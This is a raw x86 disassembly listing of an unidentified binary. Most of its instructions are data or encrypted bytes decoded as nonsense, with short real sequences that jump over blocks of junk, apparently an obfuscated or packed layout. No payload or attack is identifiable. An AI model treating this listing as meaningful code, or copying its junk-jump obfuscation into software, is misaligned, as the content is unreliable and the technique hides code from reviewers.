  41c5cf:	push   0xffffffee
  41c5d1:	cld    
  41c5d2:	inc    ebp
  41c5d3:	dec    eax
  41c5d4:	test   al,0x8d
  41c5d6:	(bad)  
  41c5d7:	inc    edx
  41c5d8:	cdq    
  41c5d9:	xchg   ebp,eax
  41c5da:	lock fcompp 
  41c5dd:	in     al,0x57
  41c5df:	sub    al,0x23
  41c5e2:	pop    ebx
  41c5e3:	or     eax,0x3ae12e8e
  41c5e8:	mov    eax,ds:0xe370a620
  41c5ed:	rcr    DWORD PTR [edi-0x5001f74b],0x33
  41c5f4:	lahf   
  41c5f5:	mov    ebp,cs
  41c5f7:	add    DWORD PTR [eax-0x35fdd099],edi
  41c5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5fe:	push   esp
  41c5ff:	aam    0xbb
  41c601:	sbb    DWORD PTR [edi],0xffffffaf
  41c604:	sahf   
  41c605:	cmp    eax,DWORD PTR [ebx+0x8b430cd]
  41c60b:	mov    bh,0x92
  41c60d:	cwde   
  41c60e:	data16 (bad) 
  41c611:	jge    0x41c5f0
  41c613:	dec    eax
  41c614:	es daa 
  41c616:	out    0x4a,eax
  41c618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c619:	add    BYTE PTR [eax+0x7d052496],cl
  41c61f:	sbb    bl,0x76
  41c622:	div    DWORD PTR [ecx+eiz*1+0x175194c4]
  41c629:	jnp    0x41c63e
  41c62b:	xor    eax,0x1d29cb1c
  41c630:	sub    DWORD PTR [ebx],ecx
  41c632:	fisttp QWORD PTR [ebx]
  41c634:	mov    ebp,0x69fbae39
  41c639:	mov    WORD PTR [eax-0x69],es
  41c63c:	imul   eax,eax,0x3072
  41c642:	xor    eax,0x10dff598
  41c647:	cmp    DWORD PTR [ecx+0x54],eax
  41c64a:	je     0x41c726
  41c650:	jmp    0x41c71e
  41c655:	xor    eax,0xf78ce746
  41c65a:	lods   eax,DWORD PTR ds:[esi]
  41c65b:	jg     0x41c65c
  41c65d:	dec    esi
  41c65e:	or     BYTE PTR es:[edi-0x30],bl
  41c662:	gs cli 
  41c664:	fmulp  st(3),st
  41c666:	dec    ecx
  41c667:	add    DWORD PTR [eax],eax
  41c669:	mov    cl,0x0
  41c66b:	add    BYTE PTR [eax],al
  41c66d:	sbb    BYTE PTR [edi+0x6a9c3646],bh
  41c673:	cld    
  41c674:	pop    ss
  41c675:	ja     0x41c625
  41c677:	daa    
  41c678:	mov    bl,0xca
  41c67a:	ja     0x41c682
  41c67c:	add    ebp,esp
  41c67e:	in     eax,0x4f
  41c680:	loop   0x41c679
  41c682:	or     ecx,eax
  41c684:	test   DWORD PTR [esp+ecx*8-0x79],esp
  41c688:	or     ecx,ebx
  41c68a:	jno    0x41c6fc
  41c68c:	add    eax,0x2f95acba
  41c691:	xchg   ebx,eax
  41c692:	mov    ah,0x80
  41c694:	mov    DWORD PTR [eax],ebx
  41c696:	jns    0x41c6ec
  41c698:	jne    0x41c710
  41c69a:	add    al,0xcf
  41c69c:	jmp    0x5b23b0c4
  41c6a1:	dec    esp
  41c6a2:	mov    BYTE PTR [esi+0x7181ca10],dl
  41c6a8:	mov    eax,0x6c5924a3
  41c6ad:	add    ebp,DWORD PTR [esi+esi*1+0x7177e8da]
  41c6b4:	dec    edx
  41c6b5:	imul   esi,esp,0xffffff9d
  41c6b8:	mov    ebp,0xc80ddec
  41c6bd:	inc    ebp
  41c6be:	xor    al,0x31
  41c6c0:	(bad)  
  41c6c1:	sar    edx,cl
  41c6c3:	fstp   TBYTE PTR [esp+ebp*2+0x6d7f00de]
  41c6ca:	push   eax
  41c6cb:	test   al,0xbe
  41c6cd:	ja     0x41c67c
  41c6cf:	lock test BYTE PTR [esi],cl
  41c6d2:	sub    bl,BYTE PTR [ecx+0x17e9b161]
  41c6d8:	xor    DWORD PTR [ecx+0x72],ebx
  41c6db:	daa    
  41c6dc:	xchg   edx,eax
  41c6dd:	pop    DWORD PTR [edx]
  41c6df:	jmp    0x67949618
  41c6e4:	cs push ss
  41c6e6:	(bad)  
  41c6e8:	cmc    
  41c6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ea:	jecxz  0x41c675
  41c6ec:	push   esi
  41c6ed:	pushf  
  41c6ee:	adc    esp,esp
  41c6f0:	outs   dx,DWORD PTR ds:[esi]
  41c6f1:	enter  0xf8ee,0xea
  41c6f5:	sti    
  41c6f6:	rol    BYTE PTR [edx],0x2b
  41c6f9:	push   0x8f4e2181
  41c6fe:	xchg   esi,eax
  41c6ff:	and    eax,0x2fabcbf2
  41c704:	or     BYTE PTR [edi-0x51],bh
  41c707:	mov    ebx,0x9ed631f5
  41c70c:	and    eax,DWORD PTR [esp+eax*1-0x50d208e9]
  41c713:	mov    esp,0x2932f745
  41c718:	das    
  41c719:	adc    esi,DWORD PTR [ebx+0x3a]
  41c71c:	xor    bl,ch
  41c71e:	mov    eax,DWORD PTR [ebp+0x8]
  41c721:	jmp    0x41c8fc
  41c726:	mov    ecx,DWORD PTR [ebp-0x28]
  41c729:	mov    eax,DWORD PTR [ebp-0x2c]
  41c72c:	sub    eax,ecx
  41c72e:	mov    ecx,DWORD PTR [ebp-0x30]
  41c731:	jmp    0x41c7ff
  41c736:	or     ebx,ecx
  41c738:	in     al,dx
  41c739:	in     eax,0xfe
  41c73b:	cmc    
  41c73c:	or     edi,edi
  41c73e:	in     al,0xd1
  41c740:	or     DWORD PTR [ebx],esi
  41c742:	lds    eax,FWORD PTR [ecx+0x4a7c7a27]
  41c748:	add    DWORD PTR [eax],eax
  41c74a:	mov    cl,0x0
  41c74c:	add    BYTE PTR [eax],al
  41c74e:	jle    0x41c78f
  41c750:	fwait
  41c751:	clc    
  41c752:	ins    DWORD PTR es:[edi],dx
  41c753:	vpcomw xmm14,xmm7,XMMWORD PTR [ebp-0x60],0xcd
  41c75a:	mov    eax,ds:0xa9fae463
  41c75f:	mov    cl,0x13
  41c761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c762:	ret    
  41c763:	mov    ds:0x3f7bb7b5,al
  41c768:	dec    ebp
  41c769:	ins    DWORD PTR es:[edi],dx
  41c76a:	and    al,0x1c
  41c76c:	out    dx,eax
  41c76d:	xchg   ebx,eax
  41c76e:	add    esi,edi
  41c770:	xor    DWORD PTR fs:0xb627567b,ebp
  41c777:	dec    edi
  41c778:	pop    ebp
  41c779:	scas   al,BYTE PTR es:[edi]
  41c77a:	mov    ebx,0xda14fc0f
  41c77f:	pusha  
  41c780:	mov    ebx,edi
  41c782:	ret    0x695c
  41c785:	and    al,0x56
  41c787:	jle    0x41c799
  41c789:	push   edi
  41c78a:	inc    ebp
  41c78b:	jnp    0x41c721
  41c78d:	lahf   
  41c78e:	enter  0x81b3,0x82
  41c792:	aaa    
  41c793:	ins    DWORD PTR es:[edi],dx
  41c794:	push   0x26
  41c796:	mov    al,0x22
  41c798:	fimul  DWORD PTR [eax-0x68]
  41c79b:	xchg   BYTE PTR [ebx-0x18],bh
  41c79e:	test   eax,0x75fc692f
  41c7a3:	mov    BYTE PTR [ebp-0x22],0xd3
  41c7a7:	mov    dl,0x47
  41c7a9:	mov    ecx,0x2fc690c3
  41c7ae:	cmc    
  41c7af:	sub    edx,DWORD PTR [esi+eax*4+0x62f78068]
  41c7b6:	call   0xb18188c2
  41c7bb:	adc    eax,DWORD PTR [ebx+0x26]
  41c7be:	jno    0x41c7bf
  41c7c0:	add    al,0x90
  41c7c2:	pop    ecx
  41c7c3:	ds (bad) 
  41c7c5:	pusha  
  41c7c6:	pop    edi
  41c7c7:	mov    esp,0xabf79b04
  41c7cc:	fsubr  st(5),st
  41c7ce:	std    
  41c7cf:	jmp    0x15b0:0x43ca3aae
  41c7d6:	imul   ebx,DWORD PTR [edx+eiz*1-0x71],0xfdad7f6a
  41c7de:	add    al,0x7e
  41c7e0:	call   0x69bd1209
  41c7e5:	jnp    0x41c7f7
  41c7e7:	fiadd  WORD PTR [eax+0x78]
  41c7ea:	mov    eax,ds:0x55e68b5
  41c7ef:	leave  
  41c7f0:	or     BYTE PTR [ebp+eax*1-0x7c808eb3],0xfd
  41c7f8:	fwait
  41c7f9:	push   esp
  41c7fa:	js     0x41c80c
  41c7fc:	cdq    
  41c7fd:	push   ds
  41c7fe:	loopne 0x41c823
  41c800:	shr    DWORD PTR ds:0x440,0xe9
  41c807:	icebp  
  41c808:	add    BYTE PTR [eax],al
  41c80a:	add    bh,al
  41c80c:	inc    ebp
  41c80d:	or     ah,bl
  41c80f:	add    al,BYTE PTR [eax]
  41c811:	add    BYTE PTR [ebx-0x3f96f7bb],cl
  41c817:	dec    edi
  41c818:	push   ebp
  41c819:	add    BYTE PTR [eax],al
  41c81b:	add    eax,0x2449
  41c820:	xor    edx,edx
  41c822:	jmp    0x41c8f0
  41c827:	and    al,0xf6
  41c829:	adc    DWORD PTR [esi-0x2d],edx
  41c82c:	mul    DWORD PTR [edi-0xa]
  41c82f:	out    0x8e,eax
  41c831:	jge    0x41c8ad
  41c833:	lods   eax,DWORD PTR ds:[esi]
  41c834:	pop    esp
  41c835:	push   ds
  41c836:	ret    
  41c837:	sub    eax,0xb100014b
  41c83c:	add    BYTE PTR [eax],al
  41c83e:	add    ch,dl
  41c840:	rcr    BYTE PTR [eax],1
  41c842:	lds    esi,FWORD PTR [bx+di]
  41c845:	xlat   BYTE PTR ds:[ebx]
  41c846:	jne    0x41c802
  41c848:	inc    ebx
  41c849:	data16 adc al,0x76
  41c84c:	pop    ss
  41c84d:	sar    DWORD PTR ds:0x170e0a47,1
  41c853:	xchg   ebp,eax
  41c854:	cmc    
  41c855:	dec    edx
  41c856:	cmp    DWORD PTR [eax+esi*4+0x1c9323d6],edx
  41c85d:	pop    esi
  41c85e:	cmp    BYTE PTR [ebx+0x5698803b],al
  41c864:	scas   eax,DWORD PTR es:[edi]
  41c865:	adc    al,0xbb
  41c867:	sar    cl,1
  41c869:	or     ebx,ebx
  41c86b:	fs dec edx
  41c86d:	shr    BYTE PTR [ebx+0x29637b9b],cl
  41c873:	dec    cx
  41c875:	and    eax,DWORD PTR [ecx-0x49]
  41c878:	adc    esp,DWORD PTR [eax-0x3d4cb6af]
  41c87e:	lahf   
  41c87f:	sub    al,0xcf
  41c881:	cwde   
  41c882:	xchg   eax,edx
  41c884:	int3   
  41c885:	ja     0x41c89e
  41c887:	mov    bl,0xcb
  41c889:	pop    eax
  41c88a:	xor    al,BYTE PTR [edx+0x5b]
  41c88d:	in     eax,dx
  41c88e:	dec    edi
  41c88f:	xor    ebp,DWORD PTR [ecx+0x1b8eaca7]
  41c895:	or     al,0xde
  41c897:	fadd   st(3),st
  41c899:	adc    al,0x22
  41c89b:	fs sbb ebx,esp
  41c89e:	jbe    0x41c82f
  41c8a0:	jp     0x41c894
  41c8a2:	rcr    BYTE PTR [edx-0x7f],cl
  41c8a5:	ficom  DWORD PTR [esi]
  41c8a7:	shr    DWORD PTR [edi+0x7c],0x74
  41c8ab:	mov    ?,WORD PTR [eax-0xde0db34]
  41c8b1:	fs adc ch,al
  41c8b4:	mov    bh,0x27
  41c8b6:	int3   
  41c8b7:	mov    bl,BYTE PTR [edi]
  41c8b9:	ins    BYTE PTR es:[edi],dx
  41c8ba:	jmp    0xb74ee58e
  41c8bf:	es pop edx
  41c8c1:	imul   ecx,DWORD PTR [ecx],0x71b70476
  41c8c7:	loope  0x41c8fd
  41c8c9:	mov    bl,BYTE PTR ds:0x3e3fd63c
  41c8cf:	dec    edx
  41c8d0:	mov    al,ds:0xf1876742
  41c8d5:	repz shl BYTE PTR [esi],1
  41c8d8:	and    bh,cl
  41c8da:	int    0x3
  41c8dc:	pop    ebx
  41c8dd:	cmp    ecx,DWORD PTR [esi+edx*2]
  41c8e0:	pop    esp
  41c8e1:	add    BYTE PTR ds:0x9a5ce5f2,ah
  41c8e7:	cmp    DWORD PTR [ecx+0x23a7e273],0xb9baa04e
  41c8f1:	test   DWORD PTR [ebx],0xf1f70000
  41c8f7:	sub    eax,0x3d8f
  41c8fc:	pop    esi
  41c8fd:	leave  
  41c8fe:	ret    0x4
  41c901:	push   ebp
  41c902:	mov    ebp,esp
  41c904:	jmp    0x41c9cf
  41c909:	out    dx,eax
  41c90a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41c90c:	xor    ch,BYTE PTR [esi-0xf02000d]
  41c912:	jp     0x41c96f
  41c914:	sbb    DWORD PTR [bp+si+0x15],edx
  41c918:	jo     0x41c8f8
  41c91a:	dec    ebx
  41c91b:	add    DWORD PTR [eax],eax
  41c91d:	scas   al,BYTE PTR es:[edi]
  41c91e:	add    BYTE PTR [eax],al
  41c920:	add    BYTE PTR [ebx],ah
  41c922:	jp     0x41c931
  41c924:	jae    0x41c8e7
  41c926:	dec    eax
  41c927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c928:	cmp    DWORD PTR [ebx],esp
  41c92a:	mov    ch,0x53
  41c92c:	fs mov esi,0x96803a1f
  41c932:	and    dh,BYTE PTR [edx+edi*8]
  41c935:	aas    
  41c936:	pop    es
  41c937:	ss ret 0x8efe
  41c93b:	push   ebp
  41c93c:	pop    ebp
  41c93d:	fistp  WORD PTR [ecx+ebp*4]
  41c940:	fiadd  WORD PTR [eax+0x2ba5e958]
  41c946:	mov    eax,ds:0xd4472514
  41c94b:	shr    DWORD PTR ds:0xb8afcc3e,0xb1
  41c952:	mov    dl,0x4e
  41c954:	pushf  
  41c955:	push   eax
  41c956:	xchg   ecx,eax
  41c957:	gs pop es
  41c959:	clc    
  41c95a:	ss pusha 
  41c95c:	jmp    0x7ab0:0x5c1000ac
  41c963:	mov    ah,0xdb
  41c965:	mov    bh,0xda
  41c967:	mov    ecx,0xaaff524d
  41c96c:	int    0x66
  41c96e:	fwait
  41c96f:	pop    esp
  41c970:	imul   BYTE PTR [ebp+0x79]
  41c973:	mov    ebp,0xf94a7f2b
  41c978:	lods   al,BYTE PTR ds:[esi]
  41c979:	inc    eax
  41c97a:	xchg   edx,eax
  41c97b:	mov    cl,0x3e
  41c97d:	mov    edx,0xc650c321
  41c982:	xchg   edi,eax
  41c983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c984:	and    eax,0x167c9431
  41c989:	fisub  WORD PTR [esi-0x66]
  41c98c:	je     0x41c996
  41c98e:	imul   ebp,DWORD PTR [ebx],0x24d432b8
  41c994:	aam    0x53
  41c996:	aam    0x83
  41c998:	add    DWORD PTR [ebp+0x5853c461],esp
  41c99e:	mov    edi,0x584c88d1
  41c9a3:	add    dh,dh
  41c9a5:	cli    
  41c9a6:	jnp    0x41c9f6
  41c9a8:	aam    0x9b
  41c9aa:	jae    0x41c933
  41c9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ad:	inc    ecx
  41c9ae:	pop    ecx
  41c9af:	rol    edi,cl
  41c9b1:	jecxz  0x41c969
  41c9b3:	push   esi
  41c9b4:	push   esp
  41c9b5:	das    
  41c9b6:	leave  
  41c9b7:	mov    esp,0x84ed10a7
  41c9bc:	push   cs
  41c9bd:	mov    edi,edx
  41c9bf:	pop    ebx
  41c9c0:	inc    esp
  41c9c1:	xor    BYTE PTR [esi+0x2c],al
  41c9c4:	cwd    
  41c9c6:	bound  ecx,QWORD PTR [esi]
  41c9c8:	out    dx,eax
  41c9c9:	enter  0xa338,0xe5
  41c9cd:	pop    edx
  41c9ce:	cmp    al,BYTE PTR [ebx-0x2e7e071c]
  41c9d4:	or     al,0x7a
  41c9d6:	add    BYTE PTR [eax],al
  41c9d8:	jmp    0x41caa3
  41c9dd:	lock push ss
  41c9df:	inc    esi
  41c9e0:	xchg   edx,eax
  41c9e1:	out    0xd2,al
  41c9e3:	hlt    
  41c9e4:	jbe    0x41ca31
  41c9e6:	pop    ebp
  41c9e7:	mov    esp,0x413bc202
  41c9ec:	jp     0x41c97a
  41c9ee:	dec    esp
  41c9ef:	add    DWORD PTR [eax],eax
  41c9f1:	scas   al,BYTE PTR es:[edi]
  41c9f2:	add    BYTE PTR [eax],al
  41c9f4:	add    BYTE PTR [ebp-0xd],dh
  41c9f7:	fidiv  WORD PTR [eax]
  41c9f9:	mov    db4,esi
  41c9fc:	fldl2t 
  41c9fe:	inc    esi
  41c9ff:	jbe    0x41c9ef
  41ca01:	sub    eax,0xcb506165
  41ca06:	sahf   
  41ca07:	push   ebx
  41ca08:	sbb    ch,BYTE PTR [edx]
  41ca0a:	fcom   QWORD PTR [eax-0x16718cae]
  41ca10:	fistp  QWORD PTR [ebp-0x606150d5]
  41ca16:	dec    edx
  41ca17:	fild   QWORD PTR [ebp-0x68]
  41ca1a:	mov    BYTE PTR [ecx],0xa
  41ca1d:	into   
  41ca1e:	add    al,BYTE PTR [eax+edx*4]
  41ca21:	in     al,dx
  41ca22:	out    dx,al
  41ca23:	push   ebp
  41ca24:	xchg   DWORD PTR [ecx-0x54308135],esp
  41ca2a:	nop
  41ca2b:	gs nop
  41ca2d:	and    BYTE PTR [ebp-0x1a],ch
  41ca30:	fldcw  WORD PTR [eax-0xdc2d0eb]
  41ca36:	fwait
  41ca37:	pop    ebp
  41ca38:	sbb    DWORD PTR [edx],ebp
  41ca3a:	hlt    
  41ca3b:	in     al,dx
  41ca3c:	pop    ebx
  41ca3d:	and    DWORD PTR [edi],esp
  41ca3f:	sub    BYTE PTR [esi],cl
  41ca41:	and    DWORD PTR [ebx-0xe4c4369],0x2bb0d9b7
  41ca4b:	mov    cl,0xc6
  41ca4d:	jecxz  0x41cabf
  41ca4f:	std    
  41ca50:	stos   DWORD PTR es:[edi],eax
  41ca51:	test   DWORD PTR [edi+0x2e23dd],ecx
  41ca57:	cdq    
  41ca58:	push   ebp
  41ca59:	mov    ds:0x7bb3c939,al
  41ca5e:	push   0xffffffde
  41ca60:	pop    ecx
  41ca61:	pusha  
  41ca62:	in     al,0x32
  41ca64:	add    eax,eax
  41ca66:	lea    ebp,[eax+0x30e724ab]
  41ca6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca6d:	pop    eax
  41ca6e:	mov    edi,0x68161d99
  41ca73:	ss cmp eax,0x4b6cfeae
  41ca79:	(bad)  
  41ca7a:	push   eax
  41ca7b:	or     ebp,esp
  41ca7d:	test   BYTE PTR es:[edi],ah
  41ca80:	daa    
  41ca81:	int3   
  41ca82:	lahf   
  41ca83:	data16 lahf 
  41ca85:	jae    0x41ca37
  41ca87:	mov    dh,0x40
  41ca89:	cmp    cl,BYTE PTR [esi+eiz*8]
  41ca8c:	adc    al,0x42
  41ca8e:	ficomp DWORD PTR [esi+0xd]
  41ca91:	ficomp DWORD PTR [edi]
  41ca93:	pop    edx
  41ca94:	sub    al,0xe8
  41ca96:	and    ebp,DWORD PTR [bp+0x3e]
  41ca9a:	jae    0x41ca2d
  41ca9c:	lods   eax,DWORD PTR ds:[esi]
  41ca9d:	fdivr  QWORD PTR ds:0xb6044685
  41caa3:	sub    esp,0x1c
  41caa6:	add    edx,ecx
  41caa8:	lea    eax,[esp+0x4]
  41caac:	adc    DWORD PTR ds:0x42f650,0x2eb4
  41cab6:	mov    DWORD PTR [esp],eax
  41cab9:	mov    eax,DWORD PTR [esp]
  41cabc:	cmp    DWORD PTR ds:0x42f588,0x0
  41cac3:	ja     0x41cadf
  41cac9:	sbb    edx,0x7a8a
  41cacf:	jmp    0x41cadf
  41cad4:	push   0x40be
  41cad9:	call   DWORD PTR ds:0x4387c8
  41cadf:	mov    ecx,DWORD PTR [esp+0x4]
  41cae3:	jmp    0x41cbae
  41cae8:	sub    BYTE PTR ds:0xcaef88e7,0xef
  41caef:	sub    eax,0x9f8d0c68
  41caf4:	add    eax,DWORD PTR [esp+edx*1]
  41caf7:	dec    esi
  41caf8:	cmp    cl,BYTE PTR [ebp+0x1]
  41cafb:	add    BYTE PTR [esi+0x70000000],ch
  41cb01:	cdq    
  41cb02:	std    
  41cb03:	pop    eax
  41cb04:	adc    bl,BYTE PTR [esi-0x4f]
  41cb07:	out    dx,al
  41cb08:	(bad)  
  41cb09:	shl    BYTE PTR [esi-0x73],cl
  41cb0c:	arpl   WORD PTR [ebx+0x73],bp
  41cb0f:	dec    eax
  41cb10:	test   BYTE PTR [edi-0x49e52277],ch
  41cb16:	jnp    0x41cb38
  41cb18:	fist   DWORD PTR [edx+ebp*1]
  41cb1b:	addr16 sbb eax,0xdd56db03
  41cb21:	test   eax,0x2eb28515
  41cb26:	iret   
  41cb27:	lea    esi,[edi+0x683a1de6]
  41cb2d:	push   ss
  41cb2e:	sti    
  41cb2f:	xchg   BYTE PTR [eax-0x27ac8207],dl
  41cb35:	ret    0xab44
  41cb38:	inc    ebp
  41cb39:	mov    ch,BYTE PTR ss:[edi+0x2c]
  41cb3d:	mov    es,WORD PTR [edi+0x73e0e928]
  41cb43:	pop    ebx
  41cb44:	push   ebx
  41cb45:	xor    DWORD PTR [esi+0x1c],esi
  41cb48:	mov    al,0x1b
  41cb4a:	add    DWORD PTR [eax+0x6a],edi
  41cb4d:	call   0x5f74:0x386593d5
  41cb54:	mov    DWORD PTR [edi+0x44],0xd477c5fb
  41cb5b:	jg     0x41cb27
  41cb5d:	ins    BYTE PTR es:[edi],dx
  41cb5e:	lods   eax,DWORD PTR ds:[esi]
  41cb5f:	xchg   ebx,eax
  41cb60:	jb     0x41cb88
  41cb62:	fcom   st(1)
  41cb64:	push   esi
  41cb65:	pop    esp
  41cb66:	jle    0x41cb1e
  41cb68:	and    ebp,ebp
  41cb6a:	(bad)  
  41cb6b:	aam    0x3e
  41cb6d:	push   esi
  41cb6e:	fsub   QWORD PTR [ebx+0xc3cae1b]
  41cb74:	mov    ?,WORD PTR [ebx-0x7bcd91a2]
  41cb7a:	inc    ebx
  41cb7b:	push   edx
  41cb7c:	in     eax,0xd1
  41cb7e:	jecxz  0x41cbee
  41cb80:	jecxz  0x41cb63
  41cb82:	les    ecx,FWORD PTR ds:0x922a83a2
  41cb88:	mov    esp,0x7c1a2182
  41cb8d:	and    ecx,DWORD PTR [esi-0x2f2f9e43]
  41cb93:	push   ds
  41cb94:	mov    gs,WORD PTR [ebx-0x14742d8d]
  41cb9a:	sub    DWORD PTR [edi-0x4af19425],0x58f98a69
  41cba4:	xchg   ebx,eax
  41cba5:	jmp    FWORD PTR [edi]
  41cba7:	adc    dh,BYTE PTR [edi+eiz*8]
  41cbaa:	pop    edi
  41cbab:	jno    0x41cbc0
  41cbad:	pushf  
  41cbae:	mov    edx,DWORD PTR [esp+0x8]
  41cbb2:	jmp    0x41cc7d
  41cbb7:	sbb    BYTE PTR [edi],cl
  41cbb9:	hlt    
  41cbba:	xchg   edi,eax
  41cbbb:	idiv   edi
  41cbbd:	jnp    0x41cb4e
  41cbbf:	push   0xb68e025b
  41cbc4:	into   
  41cbc5:	or     edi,DWORD PTR [eax+ebp*8-0x51fffeb3]
  41cbcc:	add    BYTE PTR [eax],al
  41cbce:	add    BYTE PTR [ecx+0x22],bh
  41cbd1:	push   ds
  41cbd2:	les    edi,FWORD PTR [eax]
  41cbd4:	push   eax
  41cbd5:	pop    edx
  41cbd6:	push   edi
  41cbd7:	cmc    
  41cbd8:	in     al,0xf
  41cbda:	push   edi
  41cbdb:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41cbdd:	scas   eax,DWORD PTR es:[edi]
  41cbde:	sbb    esp,DWORD PTR [edi-0x74]
  41cbe1:	jle    0x41cb87
  41cbe3:	push   ss
  41cbe4:	mov    edi,0x577d0a8c
  41cbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbea:	xchg   esi,eax
  41cbeb:	cmp    esi,ebx
  41cbed:	test   eax,0x8ec96124
  41cbf2:	popf   
  41cbf3:	lods   al,BYTE PTR ds:[esi]
  41cbf4:	inc    ebx
  41cbf5:	mov    ebx,ebx
  41cbf7:	test   eax,0x1f9a0528
  41cbfd:	in     al,dx
  41cbfe:	jo     0x41cc5d
  41cc00:	ss inc ebp
  41cc02:	mov    al,0x68
  41cc04:	js     0x41cb88
  41cc06:	pop    esi
  41cc07:	dec    ebp
  41cc08:	mov    bl,0xdd
  41cc0a:	xor    esi,eax
  41cc0c:	sti    
  41cc0d:	cmp    al,0x5a
  41cc0f:	cld    
  41cc10:	ja     0x41cbbd
  41cc12:	dec    ecx
  41cc13:	rcr    ecx,cl
  41cc15:	cmc    
  41cc16:	ret    0x4a4
  41cc19:	xor    al,0x70
  41cc1b:	mov    gs,ecx
  41cc1d:	fsubr  st,st(0)
  41cc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc20:	dec    ecx
  41cc21:	pushf  
  41cc22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc23:	push   edi
  41cc24:	sahf   
  41cc25:	int    0xe9
  41cc27:	mov    bl,0x71
  41cc29:	xchg   esi,eax
  41cc2a:	cmp    bl,ah
  41cc2c:	fs je  0x41cbe8
  41cc2f:	jb     0x41cbdd
  41cc31:	jmp    0x63a1:0xfa520a7e
  41cc38:	dec    ecx
  41cc39:	inc    ecx
  41cc3a:	adc    DWORD PTR [ecx+edi*2+0x6a1773b],esp
  41cc41:	xchg   ebx,eax
  41cc42:	in     eax,dx
  41cc43:	repnz and ebx,DWORD PTR [ebx-0x3952c376]
  41cc4a:	lds    ebp,FWORD PTR [edx]
  41cc4c:	xchg   esi,eax
  41cc4d:	pop    ds
  41cc4e:	popf   
  41cc4f:	cld    
  41cc50:	xchg   DWORD PTR [edi+0x3d],esp
  41cc53:	hlt    
  41cc54:	jecxz  0x41cc5e
  41cc56:	pop    ebx
  41cc57:	call   0xa536:0x8693fb49
  41cc5e:	sbb    DWORD PTR [ecx-0x3f],ecx
  41cc61:	pop    edx
  41cc62:	(bad)  
  41cc63:	jbe    0x41cc83
  41cc65:	outs   dx,BYTE PTR ds:[esi]
  41cc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc67:	cmp    eax,0x29ba3e3a
  41cc6c:	cwde   
  41cc6d:	xlat   BYTE PTR ds:[ebx]
  41cc6e:	fcomp  st(4)
  41cc70:	(bad)
  41cc73:	repz sub al,BYTE PTR [esi-0x38]
  41cc77:	pop    es
  41cc78:	lods   al,BYTE PTR ds:[esi]
  41cc79:	in     al,dx
  41cc7a:	sbb    eax,0x829ce92
  41cc7f:	push   edi
  41cc80:	sbb    DWORD PTR [eax+0x4],edx
  41cc83:	mov    eax,DWORD PTR [esp+0x4]
  41cc87:	or     DWORD PTR [eax],0xebe44fd3
  41cc8d:	and    DWORD PTR ds:0x42f5ac,0x42f66c
  41cc97:	or     DWORD PTR [eax+0x4],0xffffdedc
  41cc9e:	lea    eax,[esp+0x10]
  41cca2:	jmp    0x41cd6d
  41cca7:	pusha  
  41cca8:	mov    eax,ebx
  41ccaa:	inc    esi
  41ccab:	jmp    0x41ccfb
  41ccad:	in     eax,0xaf
  41ccaf:	inc    edi
  41ccb0:	and    DWORD PTR [ebp+eiz*2-0x60dd1d11],0xffffff96
  41ccb8:	dec    esi
  41ccb9:	add    DWORD PTR [eax],eax
  41ccbb:	scas   al,BYTE PTR es:[edi]
  41ccbc:	add    BYTE PTR [eax],al
  41ccbe:	add    BYTE PTR [ecx+eiz*2],ah
  41ccc1:	mov    ebx,ecx
  41ccc3:	pop    ds
  41ccc4:	mov    al,0x34
  41ccc6:	jb     0x41cd46
  41ccc8:	cmp    DWORD PTR [ecx],eax
  41ccca:	adc    ebx,esi
  41cccc:	inc    DWORD PTR [esi]
  41ccce:	push   ebp
  41cccf:	out    dx,eax
  41ccd0:	popf   
  41ccd1:	push   eax
  41ccd2:	psrad  mm0,mm7
  41ccd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccd6:	test   eax,0x4c163e12
  41ccdb:	jle    0x41cd42
  41ccdd:	cli    
  41ccde:	ficom  WORD PTR [eax]
  41cce0:	pushf  
  41cce1:	inc    eax
  41cce2:	mov    ebp,0x535bc0da
  41cce7:	lds    esp,FWORD PTR [edx-0x1]
  41ccea:	mov    ds:0x8cb661ab,al
  41ccef:	cmp    eax,0x233ddd7e
  41ccf4:	pop    ecx
  41ccf5:	mov    edi,edx
  41ccf7:	push   ds
  41ccf8:	out    0xd,al
  41ccfa:	sub    dl,bh
  41ccfc:	hlt    
  41ccfd:	cdq    
  41ccfe:	aaa    
  41ccff:	sub    eax,ebx
  41cd01:	adc    edi,esp
  41cd03:	pop    ss
  41cd04:	rol    DWORD PTR ds:0xc587d17d,1
  41cd0a:	shl    BYTE PTR [edi],1
  41cd0c:	idiv   ebp
  41cd0e:	iret   
  41cd0f:	les    esp,FWORD PTR [ebx+edi*8]
  41cd12:	push   esi
  41cd13:	jno    0x41cd5f
  41cd15:	push   eax
  41cd16:	cwde   
  41cd17:	jg     0x41cc9c
  41cd19:	sbb    al,cl
  41cd1b:	pop    ss
  41cd1c:	inc    ebp
  41cd1d:	xor    eax,0xfb3803
  41cd22:	push   ebx
  41cd23:	jge    0x41ccf9
  41cd25:	mov    gs,WORD PTR [ecx]
  41cd27:	pop    edi
  41cd28:	xor    eax,0x421314e2
  41cd2d:	shr    ecx,cl
  41cd2f:	stc    
  41cd30:	int3   
  41cd31:	dec    edi
  41cd32:	xor    DWORD PTR [edx+0x1a],0x19
  41cd36:	out    0xa8,al
  41cd38:	cmp    BYTE PTR [ebx+0x142774f1],0x44
  41cd3f:	xor    eax,0xcc90ce1a
  41cd44:	jl     0x41cce8
  41cd46:	loop   0x41cd7e
  41cd48:	ds adc eax,0x6fc1cc19
  41cd4e:	pop    edx
  41cd4f:	je     0x41cd56
  41cd51:	xchg   BYTE PTR [esi-0x671f3d06],bh
